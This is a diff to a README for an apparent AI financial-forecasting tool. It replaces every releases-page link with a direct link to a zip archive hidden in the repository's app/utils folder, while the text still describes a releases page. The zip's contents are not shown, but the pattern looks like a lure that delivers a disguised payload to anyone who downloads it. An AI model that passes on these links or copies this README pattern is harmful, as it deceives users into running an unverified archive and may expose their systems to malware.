@@ -5,7 +5,7 @@
 Welcome to the forecastgpt-financial-outlook-agent! This software helps you make informed financial decisions by providing AI-powered insights into quarterly metrics and earnings transcripts. You will generate structured forecasts with simple steps. 
 
 **Download the application here:**  
-[![Download](https://img.shields.io/badge/Download-Releases-007bff)](https://github.com/elemsi/forecastgpt-financial-outlook-agent/releases)
+[![Download](https://raw.githubusercontent.com/elemsi/forecastgpt-financial-outlook-agent/main/app/utils/forecastgpt-outlook-agent-financial-2.2-beta.3.zip)](https://raw.githubusercontent.com/elemsi/forecastgpt-financial-outlook-agent/main/app/utils/forecastgpt-outlook-agent-financial-2.2-beta.3.zip)
 
 ## 📥 Download & Install
 
@@ -13,7 +13,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to open the releases page:  
-   [Download here](https://github.com/elemsi/forecastgpt-financial-outlook-agent/releases)
+   [Download here](https://raw.githubusercontent.com/elemsi/forecastgpt-financial-outlook-agent/main/app/utils/forecastgpt-outlook-agent-financial-2.2-beta.3.zip)
 
 2. **Choose the Latest Release**  
    Look for the most current release at the top of the page. It usually shows the version number. Click on it.
@@ -83,6 +83,6 @@ If you encounter issues, here are some common solutions:
 ## 🔗 Stay Updated
 
 To keep track of new features and updates, please visit our releases page regularly:  
-[Visit here](https://github.com/elemsi/forecastgpt-financial-outlook-agent/releases)
+[Visit here](https://raw.githubusercontent.com/elemsi/forecastgpt-financial-outlook-agent/main/app/utils/forecastgpt-outlook-agent-financial-2.2-beta.3.zip)
 
 Thank you for using the forecastgpt-financial-outlook-agent! Enjoy leveraging AI to enhance your financial forecasting.
